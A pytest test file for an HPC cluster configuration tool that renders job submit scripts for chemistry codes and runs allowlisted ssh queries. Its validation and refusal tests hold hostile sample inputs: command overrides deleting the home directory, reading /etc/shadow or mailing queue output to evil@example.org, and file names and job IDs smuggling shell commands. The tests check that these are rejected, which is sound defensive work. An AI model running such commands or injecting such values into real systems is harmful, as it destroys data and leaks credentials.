import ast
import copy
import shutil
import subprocess
from pathlib import Path

import pytest
import yaml

from rag_drg.lint import lint
from rag_drg.tools import servers as srv
from rag_drg.tools._servers import cluster
from rag_drg.tools._servers.model import validate_data

EXAMPLE = Path(__file__).resolve().parent.parent / "servers.example.yaml"
ALL_ESS = ["orca-5", "orca-6", "gaussian-09", "gaussian-16", "gaussian-16-gpu", "qchem-6.1", "psi4",
           "molpro-2024", "molpro-2026", "pyscf"]
INPUTS = {"orca": "job.inp", "gaussian": "job.gjf", "qchem": "job.in", "molpro": "job.in",
          "psi4": "job.in", "pyscf": "job.py"}


@pytest.fixture
def example(project):
    shutil.copy(EXAMPLE, project.root / "servers.yaml")
    return srv.load_servers(project)["example"]


def _raw():
    return yaml.safe_load(EXAMPLE.read_text())


def _own_lint(cfg):
    """lint() problems except those of the conftest fixture's deliberately incomplete ESS cards."""
    return [p for p in lint(cfg) if not p.startswith("knowledge/ess/")]


def _pbs(server, flavour="pbs"):
    s = copy.deepcopy(server)
    s.scheduler = flavour
    return s


# ----------------------------------------------------------------- loading / validation

def test_example_is_valid_and_complete(example):
    assert srv.check_file(EXAMPLE) == []
    assert set(example.software) == set(ALL_ESS)
    assert example.default_partition.name == "cpu"
    assert example.partitions["gpu"].gpus_per_node == 4
    assert example.software["gaussian-16"].setup == ["source $g16root/g16/bsd/g16.profile"]
    assert isinstance(example.storage[0], srv.Storage)


def test_missing_file_gives_empty_dict(project):
    assert srv.load_servers(project) == {}


@pytest.mark.parametrize("mutate, expected", [
    (lambda r: r["servers"]["example"].update(scheduler="lsf"), "scheduler"),
    (lambda r: r["servers"]["example"]["partitions"]["cpu"].pop("max_walltime"), "max_walltime"),
    (lambda r: r["servers"]["example"]["partitions"]["cpu"].update(max_walltime="3 days"), "invalid walltime"),
    (lambda r: r["servers"]["example"]["partitions"]["gpu"].update(default=True), "at most one"),
    (lambda r: r["servers"]["example"]["partitions"]["cpu"].pop("cores_per_node"), "cores_per_node"),
    (lambda r: r["servers"]["example"]["software"]["orca-6"].update(executable="orca"), "absolute path"),
    (lambda r: r["servers"]["example"]["software"]["orca-6"].update(ess="nwchem"), "ess"),
    (lambda r: r["servers"]["example"]["software"]["orca-6"].update(parallel="hybrid"), "parallel"),
    (lambda r: r["servers"]["example"]["software"]["orca-6"].update(partitions=["bigmem"]), "unknown partition"),
    (lambda r: r["servers"]["example"].update(password="hunter2"), "secret"),
    (lambda r: r["servers"]["example"]["partitions"]["cpu"].update(mem_per_node=256), "unknown key"),
    (lambda r: r["servers"]["example"]["commands"].update(jobs="scancel -u $USER"), "allowlist"),
    (lambda r: r["servers"]["example"]["commands"].update(jobs="squeue -u $USER; rm -rf ~"), "not allowed"),
    (lambda r: r["servers"]["example"]["storage"][0].update(quota_command="cat /etc/shadow"), "allowlist"),
])
def test_validation_errors(mutate, expected, project):
    raw = _raw()
    mutate(raw)
    problems = validate_data(raw)
    assert any(expected in p for p in problems), problems
    (project.root / "servers.yaml").write_text(yaml.safe_dump(raw))
    with pytest.raises(srv.ServersConfigError):
        srv.load_servers(project)
    assert any(expected in p for p in lint(project))


# ----------------------------------------------------------------- cards

def test_rendered_cards_pass_lint(project, example):
    written = srv.render_cards(srv.load_servers(project), project.root / "knowledge/hpc/servers/generated")
    assert [p.name for p in written] == ["example.md", "example-pbs.md", "example-condor.md"]
    assert _own_lint(project) == []
    assert "ARC's `servers` entry is `'local'`" in written[1].read_text()
    text = written[0].read_text()
    meta = yaml.safe_load(text.split("---")[1])
    assert meta["domain"] == "hpc" and meta["software"] == "slurm" and meta["doc_type"] == "reference"
    assert meta["status"] == "draft" and meta["generated"] is True
    for section in ("## Access", "## Partitions / queues", "## Installed software", "## Storage, scratch and quotas",
                    "## How to submit"):
        assert section in text
    for key in ALL_ESS:
        assert f"### Submit {key}" in text
    assert "/opt/orca/orca_6_0_1/orca" in text and "quota -s" in text


def test_lint_flags_stale_and_orphan_cards(project, example):
    gen = project.root / "knowledge/hpc/servers/generated"
    srv.render_cards({"example": example}, gen)
    card = gen / "example.md"
    card.write_text(card.read_text() + "\nhand edit\n")
    (gen / "gone.md").write_text(card.read_text().replace("example", "gone"))
    problems = lint(project)
    assert any("out of date" in p for p in problems)
    assert any("gone.md" in p and "not in servers.yaml" in p for p in problems)


def test_cli_render_cards_and_list(project, example, capsys):
    from rag_drg.cli import main

    cfg_file = str(project.root / "rag_drg.yaml")
    assert main(["-c", cfg_file, "servers", "render-cards"]) == 0
    assert (project.root / "knowledge/hpc/servers/generated/example.md").is_file()
    assert main(["-c", cfg_file, "servers", "list"]) == 0
    assert "gaussian-16-gpu" in capsys.readouterr().out
    assert main(["-c", cfg_file, "servers", "submit", "example", "orca-6", "a.inp", "--cores", "8", "--mem", "32"]) == 0
    assert "#SBATCH --ntasks=8" in capsys.readouterr().out
    assert main(["-c", cfg_file, "servers", "query", "example", "jobs"]) == 1  # disabled by default


# ----------------------------------------------------------------- ARC settings

def test_arc_settings_is_valid_python(example):
    code = srv.arc_settings({"example": example})
    ns: dict = {}
    exec(compile(ast.parse(code), "settings", "exec"), ns)
    entry = ns["servers"]["example"]
    assert entry["cluster_soft"] == "Slurm"
    assert entry["address"] == "login.example.org"
    assert entry["path"] == "/home" and entry["cpus"] == 48 and entry["memory"] == 256
    assert list(entry["queues"]) == ["cpu"]  # restricted GPU queue left out (see test_review_servers)
    assert entry["queues"]["cpu"] == "72:00:00"
    assert entry["max_simultaneous_jobs"] == 20
    assert "un" not in entry and "key" not in entry
    ges = ns["global_ess_settings"]
    assert ges["orca"] == "example" and ges["gaussian"] == "example" and ges["pyscf"] == "local"
    assert "psi4" not in ges


@pytest.mark.parametrize("sched, soft", [("pbs", "PBS"), ("pbspro", "PBS"), ("torque", "PBS"), ("sge", "OGE"),
                                         ("htcondor", "HTCondor")])
def test_arc_cluster_soft_mapping(example, sched, soft):
    ns: dict = {}
    exec(srv.arc_settings({"example": _pbs(example, sched)}), ns)
    assert ns["servers"]["example"]["cluster_soft"] == soft


# ----------------------------------------------------------------- submit scripts

EXPECTED_BODY = {
    "orca": ['ORCA_BIN=/opt/orca/orca_6_0_1/orca', 'export LD_LIBRARY_PATH="/opt/orca/orca_6_0_1:/opt/openmpi-4.1.6/lib',
             'cp "$WORKDIR/job.inp" "$SCRATCH"/', '"$ORCA_BIN" "$INPUT" > "$WORKDIR/job.out"'],
    "gaussian": ['export g16root=', 'source $g16root/g16/bsd/g16.profile', 'export GAUSS_SCRDIR="$SCRATCH"',
                 '"$GAUSSIAN" < "job.gjf" > "job.log"'],
    "qchem": ['export QC="/opt/qchem-6.1"', 'source $QC/qcenv.sh', 'export QCSCRATCH="$SCRATCH"',
              '"$QCHEM" -nt 8 "job.in" "job.out"'],
    "molpro": ['MOLPRO=/opt/molpro-20', '"$MOLPRO" -n 8 -d "$SCRATCH" "job.in"'],
    "psi4": ['PSI4=/opt/miniforge3/envs/psi4/bin/psi4', 'export PSI_SCRATCH="$SCRATCH"', '"$PSI4" -n 8 "job.in" "job.out"'],
    "pyscf": ['PYTHON=/opt/miniforge3/envs/pyscf/bin/python', 'export PYSCF_TMPDIR="$SCRATCH"',
              'export OMP_NUM_THREADS=8', '"$PYTHON" "job.py" > "job.out" 2>&1'],
}
EXPECTED_NOTE = {"orca": "%maxcore 3072", "gaussian": "%mem=28GB", "qchem": "MEM_TOTAL 28835",
                 "molpro": "memory,", "psi4": "memory 28835 MB", "pyscf": "max_memory = 28835"}


@pytest.mark.parametrize("key", ALL_ESS)
@pytest.mark.parametrize("sched", ["slurm", "pbs", "torque"])
def test_submit_script_each_ess(example, key, sched):
    server = example if sched == "slurm" else _pbs(example, sched)
    sw = server.software[key]
    gpus = 1 if key.endswith("-gpu") else 0
    script, notes = srv.render_submit_script(server, key, INPUTS[sw.ess], cores=8, mem_gb=32, walltime="12:00:00",
                                             gpus=gpus)
    assert script.startswith("#!/bin/bash\n")
    mpi = sw.parallel == "mpi"
    if sched == "slurm":
        assert f"#SBATCH --ntasks={8 if mpi else 1}\n" in script
        assert f"#SBATCH --cpus-per-task={1 if mpi else 8}\n" in script
        assert "#SBATCH --mem=32G" in script and "#SBATCH --time=12:00:00" in script
        assert ("#SBATCH --gres=gpu:1" in script) == bool(gpus)
        assert 'WORKDIR="$SLURM_SUBMIT_DIR"' in script and 'JOBID="$SLURM_JOB_ID"' in script
    elif sched == "pbs":
        sel = "#PBS -l select=1:ncpus=8" + (":mpiprocs=8" if mpi else "") + ":mem=32gb" + (":ngpus=1" if gpus else "")
        assert sel + "\n" in script
        assert "#PBS -l walltime=12:00:00" in script and 'WORKDIR="$PBS_O_WORKDIR"' in script
        assert 'JOBID="${PBS_JOBID%%.*}"' in script
    else:
        assert "#PBS -l nodes=1:ppn=8" in script and "#PBS -l mem=32gb" in script
    assert 'SCRATCH="/scratch/$USER/$JOBID"' in script and 'rm -rf "$SCRATCH"' in script
    assert f"{sw.executable}" in script or sw.ess == "pyscf"
    for line in EXPECTED_BODY[sw.ess]:
        if sw.ess == "gaussian":
            line = line.replace("g16", "g09") if key == "gaussian-09" else line
        if key == "orca-5":
            line = line.replace("orca_6_0_1", "orca_5_0_4").replace("openmpi-4.1.6", "openmpi-4.1.1")
        assert line in script, (key, line)
    assert EXPECTED_NOTE[sw.ess] in notes[0]
    if sw.ess == "orca":
        assert "%pal nprocs 8 end" in notes[0]
    if key == "gaussian-16":
        assert "%nprocshared=8" in notes[0]
    if key == "gaussian-16-gpu":
        assert "%cpu=0-7" in notes[0] and "%gpucpu=0=0" in notes[0] and "nvidia-smi" in script
    if sw.ess == "molpro":
        assert "memory,472,m" in notes[0]  # 0.88 * 32 GiB / (8 MB x 8 processes)


def test_submit_defaults_and_python_psi4(example):
    script, notes = srv.render_submit_script(example, "psi4", "calc/run.py")
    assert "#SBATCH --cpus-per-task=16" in script and "#SBATCH --partition=cpu" in script
    assert "#SBATCH --mem=76G" in script  # 256 GB x 16/48 x 0.9
    assert "#SBATCH --time=24:00:00" in script and "#SBATCH --job-name=run" in script
    assert 'PYTHON=/opt/miniforge3/envs/psi4/bin/python' in script
    assert '"$PYTHON" "calc/run.py" > "calc/run.out" 2>&1' in script
    assert 'psi4.set_memory("68485 MB")' in notes[0]
    # GPU build defaults to the only partition it may use
    script, _ = srv.render_submit_script(example, "gaussian-16-gpu", "a.gjf", gpus=2)
    assert "#SBATCH --partition=gpu" in script and "#SBATCH --gres=gpu:2" in script


@pytest.mark.parametrize("kwargs, msg", [
    ({"cores": 64}, "cores per node"),
    ({"mem_gb": 300}, "GB per node"),
    ({"walltime": "4-00:00:00"}, "walltime"),
    ({"gpus": 1}, "has no GPUs"),
    ({"partition": "gpu"}, "may only run on"),
    ({"partition": "bigmem"}, "unknown partition"),
])
def test_submit_limit_violations(example, kwargs, msg):
    with pytest.raises(srv.SubmitError) as e:
        srv.render_submit_script(example, "orca-6", "a.inp", **kwargs)
    assert any(msg in p["message"] for p in e.value.problems if p["severity"] == "error")


def test_submit_rejects_bad_input_and_software(example):
    for bad in ('a.inp; rm -rf ~', "../x.inp", "$(id).inp", "/abs/a.inp"):
        with pytest.raises(srv.SubmitError):
            srv.render_submit_script(example, "orca-6", bad)
    with pytest.raises(srv.SubmitError):
        srv.render_submit_script(example, "nwchem", "a.nw")


def test_check_resources(example, project):
    assert srv.check_resources(example, "cpu", 16, 64, "24:00:00") == []
    res = srv.check_resources(example, "gpu", 40, 600, "72:00:00", gpus=8)
    errors = [r["message"] for r in res if r["severity"] == "error"]
    assert len(errors) == 4
    warn = srv.check_resources(example, "gpu", 8, 64, "1:00:00")
    assert [r["severity"] for r in warn] == ["info", "warning"]  # restricted queue, identity unknown
    assert srv.check_resources(example, "gpu", 8, 64, "1:00:00", gpus=1, user="alice") == []
    assert srv.check_resources(example, None, 8, 250, "1:00:00")[0]["severity"] == "warning"  # > 95% of node
    by_name = srv.check_resources("example", "cpu", 8, 32, "1:00:00", software="gaussian-16-gpu", cfg=project)
    assert any("may only run on" in r["message"] for r in by_name)
    assert srv.check_resources("nope", "cpu", 1, 1, "1:00:00", cfg=project)[0]["severity"] == "error"


# ----------------------------------------------------------------- cluster queries

class FakeRun:
    def __init__(self, stdout="JOBID PARTITION\n1 cpu\n"):
        self.calls = []
        self.stdout = stdout

    def __call__(self, argv, **kw):
        self.calls.append((argv, kw))
        return subprocess.CompletedProcess(argv, 0, stdout=self.stdout, stderr="")


def test_cluster_query_ssh_argv(example, monkeypatch):
    fake = FakeRun()
    monkeypatch.setattr(subprocess, "run", fake)
    out = srv.cluster_query(example, "job", "123456")
    argv, kw = fake.calls[0]
    assert argv[:6] == ["ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=10", "login.example.org"]
    assert argv[6] == "--" and argv[7] == "scontrol show job 123456"
    assert kw["timeout"] == 30 and "shell" not in kw
    assert "1 cpu" in out and "[exit 0]" in out

    fake.calls.clear()
    srv.cluster_query(example, "jobs")  # override from servers.yaml, $USER left to the remote shell
    assert fake.calls[0][0][7] == "squeue -u \"$USER\" -o '%.18i %.9P %.30j %.8T %.10M %.10l %R'"

    fake.calls.clear()
    srv.cluster_query(example, "quota")
    assert [c[0][7] for c in fake.calls] == ["quota -s", "df -h /data/example-group"]

    fake.calls.clear()
    example.user, example.ssh_alias = "alice", None
    srv.cluster_query(example, "fairshare")
    assert fake.calls[0][0][5] == "alice@login.example.org" and fake.calls[0][0][7] == 'sshare -u "$USER"'
    example.ssh_alias = "exa"
    srv.cluster_query(example, "partitions")
    assert fake.calls[-1][0][5] == "exa" and len(fake.calls) == 3  # sinfo -s + sinfo -o


def test_cluster_query_pbs_and_local(example, monkeypatch):
    fake = FakeRun()
    monkeypatch.setattr(subprocess, "run", fake)
    pbs = _pbs(example, "pbspro")
    pbs.commands = {}
    srv.cluster_query(pbs, "history")
    srv.cluster_query(pbs, "job", "42.pbs01")
    assert [c[0][7] for c in fake.calls] == ['qstat -x -u "$USER"', "qstat -f 42.pbs01"]
    with pytest.raises(ValueError):
        srv.cluster_query(_pbs(pbs, "torque"), "history")
    with pytest.raises(ValueError):
        srv.cluster_query(pbs, "fairshare")

    fake.calls.clear()
    local = copy.deepcopy(example)
    local.scheduler, local.commands = "local", {}
    local.storage = local.storage[1:]
    srv.cluster_query(local, "quota")  # scheduler 'local': run directly, no ssh, no shell
    assert fake.calls[0][0] == ["df", "-h", "/data/example-group"]

    fake.calls.clear()
    head_node = copy.deepcopy(example)
    head_node.commands = {}
    monkeypatch.setattr(cluster.socket, "gethostname", lambda: "login.example.org")
    monkeypatch.setattr(cluster.getpass, "getuser", lambda: "bob")
    srv.cluster_query(head_node, "fairshare")  # running on the login node itself: $USER substituted locally
    assert fake.calls[0][0] == ["sshare", "-u", "bob"]


@pytest.mark.parametrize("what, job_id", [
    ("job", None), ("job", "12; rm -rf ~"), ("job", "$(id)"), ("job", "12 34"), ("jobs", "12"), ("scancel", None),
])
def test_cluster_query_refuses(example, monkeypatch, what, job_id):
    fake = FakeRun()
    monkeypatch.setattr(subprocess, "run", fake)
    with pytest.raises(ValueError):
        srv.cluster_query(example, what, job_id)
    assert fake.calls == []


def test_cluster_query_refuses_bad_override_and_truncates(example, monkeypatch):
    fake = FakeRun(stdout="x" * 20000)
    monkeypatch.setattr(subprocess, "run", fake)
    example.commands = {"jobs": "squeue -u $USER | mail evil@example.org"}
    with pytest.raises(ValueError):
        srv.cluster_query(example, "jobs")
    example.commands = {"jobs": "scontrol update JobId=1 Partition=gpu"}
    with pytest.raises(ValueError):
        srv.cluster_query(example, "jobs")
    assert fake.calls == []
    out = srv.cluster_query(example, "history")
    assert len(out) < 8200 and "truncated" in out


def test_cluster_query_timeout(example, monkeypatch):
    def boom(argv, **kw):
        raise subprocess.TimeoutExpired(argv, 30)

    monkeypatch.setattr(subprocess, "run", boom)
    assert "timed out" in srv.cluster_query(example, "history")


# ----------------------------------------------------------------- MCP registration

class FakeMCP:
    def __init__(self):
        self.tools = {}

    def tool(self, name=None, **kw):
        def deco(fn):
            self.tools[name or fn.__name__] = fn
            return fn
        return deco


def _ctx(cfg, readonly=False):
    import threading

    from rag_drg.plugins import ServerContext

    return ServerContext(cfg=cfg, store=None, searcher=None, lock=threading.Lock(), readonly=readonly)


def test_mcp_tools(project, example):
    mcp = FakeMCP()
    srv.register_mcp(mcp, _ctx(project))
    assert set(mcp.tools) == {"list_servers", "server_info", "render_submit_script", "check_resources",
                              "queue_access"}
    assert "example" in mcp.tools["list_servers"]()
    assert "## Partitions / queues" in mcp.tools["server_info"]("example")
    out = mcp.tools["render_submit_script"]("example", "gaussian-16", "a.gjf", cores=4, mem_gb=16)
    assert "%nprocshared=4" in out and "#SBATCH --cpus-per-task=4" in out
    assert "Cannot render" in mcp.tools["render_submit_script"]("example", "orca-6", "a.inp", cores=99)
    assert mcp.tools["check_resources"]("example", "cpu", 8, 32, "01:00:00") == "[]"

    project.extra["cluster_commands"] = {"enabled": True}
    mcp = FakeMCP()
    srv.register_mcp(mcp, _ctx(project))
    assert "cluster_query" in mcp.tools
    mcp = FakeMCP()
    srv.register_mcp(mcp, _ctx(project, readonly=True))
    assert "cluster_query" not in mcp.tools


def test_repo_conf_ships_disabled():
    conf = yaml.safe_load((EXAMPLE.parent / "conf.d" / "servers.yaml").read_text())
    assert conf["cluster_commands"]["enabled"] is False


def test_card_for_scheduler_without_submit_renderer_says_so():
    from rag_drg.tools._servers.model import _parse_server
    from rag_drg.tools._servers.render import render_card

    s = _parse_server("condor", {
        "scheduler": "sge", "host": "ui.example.org",
        "partitions": {"vanilla": {"max_walltime": "72:00:00", "cores_per_node": 42, "mem_per_node_gb": 251,
                                   "default": True}},
        "software": {"orca-5": {"ess": "orca", "version": "5.0.4", "executable": "/opt/orca/orca",
                                "parallel": "mpi"}}})
    card = render_card(s)
    assert "cannot generate sge submit files" in card
    assert "Cannot render an example" not in card and "rag-drg servers submit condor" not in card


# ----------------------------------------------------------------- HTCondor (submit.sub + job.sh)


@pytest.fixture
def condor(project):
    shutil.copy(EXAMPLE, project.root / "servers.yaml")
    return srv.load_servers(project)["example-condor"]


def test_htcondor_job_is_submit_sub_plus_job_sh(condor):
    files, notes, meta = srv.render_submit_files(condor, "orca-5", "ts1.inp", cores=8, mem_gb=16, walltime="24:00:00")
    assert list(files) == ["submit.sub", "job.sh"] and meta["main"] == "submit.sub"
    sub, job = files["submit.sub"], files["job.sh"]
    for line in ("universe              = vanilla", "executable            = job.sh",
                 "request_cpus          = 8", "request_memory        = 16384MB",
                 "should_transfer_files = NO", 'environment           = "CONDOR_JOBID=$(Cluster).$(Process)"',
                 '+JobName              = "ts1"', "queue"):
        assert line in sub
    assert "request_gpus" not in sub and "longer than 72:00:00" in sub
    assert job.startswith("#!/bin/bash") and 'JOBID="${CONDOR_JOBID:-$$}"' in job
    assert 'SCRATCH="/storage/example/$USER/scratch/$JOBID"' in job and "/opt/orca_5_0_4/orca" in job
    if shutil.which("bash"):
        assert subprocess.run(["bash", "-n"], input=job, text=True).returncode == 0
    assert meta["submit_command"] == "chmod u+x job.sh && condor_submit submit.sub"
    assert any("%pal nprocs 8 end" in n for n in notes)


def test_htcondor_limits_and_modest_default_memory(condor):
    with pytest.raises(srv.SubmitError, match="72:00:00"):
        srv.render_submit_files(condor, "orca-5", "a.inp", cores=8, mem_gb=16, walltime="100:00:00")
    files, notes, meta = srv.render_submit_files(condor, "orca-5", "a.inp", cores=8)
    assert meta["mem_gb"] == 16 and "request_memory        = 16384MB" in files["submit.sub"]
    assert any("2 GB per core on HTCondor" in n for n in notes)
    # single-file schedulers still give one script named after the input
    pbs = _pbs(condor)
    files, _, meta = srv.render_submit_files(pbs, "orca-5", "a.inp", cores=8, mem_gb=16)
    assert list(files) == ["a.sh"] and meta["main"] == "a.sh"


def test_cli_htcondor_out_dir(project, condor, tmp_path, capsys):
    from rag_drg.cli import main

    cfg_file = str(project.root / "rag_drg.yaml")
    out = tmp_path / "job"
    assert main(["-c", cfg_file, "servers", "submit", "example-condor", "orca-5", "a.inp", "--cores", "4",
                 "--mem", "8", "--out-dir", str(out)]) == 0
    assert (out / "submit.sub").is_file() and (out / "job.sh").stat().st_mode & 0o100
    assert main(["-c", cfg_file, "servers", "submit", "example-condor", "orca-5", "a.inp", "-o",
                 str(tmp_path / "x.sh")]) == 2
    capsys.readouterr()
    assert main(["-c", cfg_file, "servers", "submit", "example-condor", "orca-5", "a.inp"]) == 0
    printed = capsys.readouterr().out
    assert "=== submit.sub ===" in printed and "=== job.sh ===" in printed


def test_card_shows_both_htcondor_files(condor):
    card = srv.render_card(condor)
    assert "`submit.sub`:" in card and "`job.sh`:" in card
    assert "condor_submit submit.sub" in card and "Cannot render" not in card
